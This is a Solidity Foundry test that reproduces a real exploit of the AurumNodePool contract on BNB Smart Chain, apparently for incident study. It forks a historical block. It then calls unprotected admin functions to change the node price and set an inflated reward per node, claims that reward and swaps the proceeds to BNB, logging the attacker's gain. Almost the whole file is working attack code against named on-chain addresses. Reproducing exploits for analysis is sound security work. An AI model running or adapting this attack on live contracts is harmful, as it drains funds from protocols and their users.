// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/AnciliaInc/status/1595142246570958848
// @TX
// https://phalcon.blocksec.com/tx/bsc/0xb3bc6ca257387eae1cea3b997eb489c1a9c208d09ec4d117198029277468e25d
// https://phalcon.blocksec.com/tx/bsc/0x7f031e8543e75bd5c85168558be89d2e08b7c02a32d07d76517cdbb10e279782
interface IAurumNodePool {
    struct NodeEntity {
        uint256 nodeId;
        uint256 creationTime;
        uint256 lastClaimTime;
    }

    function createNode(uint256 count) external;
    function changeNodePrice(uint256 newNodePrice) external;
    function changeRewardPerNode(uint256 _rewardPerDay) external;
    function claimNodeReward(uint256 _creationTime) external;

    function getRewardAmountOf(address account, uint256 creationTime) external view returns (uint256);
    function getNodes(address account) external view returns (NodeEntity[] memory nodes);
}

contract ContractTest is Test {
    IERC20 AUR = IERC20(0x73A1163EA930A0a67dFEFB9C3713Ef0923755B78);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    IAurumNodePool AurumNodePool = IAurumNodePool(0x70678291bDDfd95498d1214BE368e19e882f7614);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23_282_134);
        cheats.deal(address(this), 0.01 ether);
    }

    function testExploit() public {
        AUR.approve(address(AurumNodePool), type(uint256).max);
        AUR.approve(address(Router), type(uint256).max);

        emit log_named_decimal_uint("[Start] Attacker BNB balance before exploit", address(this).balance, 18);

        BNBtoAUR(0.01 ether);

        AurumNodePool.changeNodePrice(1_000_000_000_000_000_000_000);
        AurumNodePool.createNode(1);

        IAurumNodePool.NodeEntity[] memory nodes = AurumNodePool.getNodes(address(this));

        cheats.roll(23_282_171);
        cheats.warp(1_669_141_486);

        AurumNodePool.changeRewardPerNode(434_159_898_144_856_792_986_061_626_032);

        emit log_named_uint(
            "AurumNodePool Attacker reward:", AurumNodePool.getRewardAmountOf(address(this), nodes[0].creationTime)
        );

        require(block.timestamp > nodes[0].lastClaimTime);

        AurumNodePool.claimNodeReward(nodes[0].creationTime);

        AURtoBNB();

        emit log_named_decimal_uint("[End] Attacker BNB balance after exploit", address(this).balance, 18);
    }

    function BNBtoAUR(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(AUR);
        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0, path, address(this), block.timestamp + 60
        );
    }

    function AURtoBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(AUR);
        path[1] = address(WBNB);
        Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            AUR.balanceOf(address(this)), 0, path, address(this), block.timestamp + 60
        );
    }

    fallback() external payable {}
}
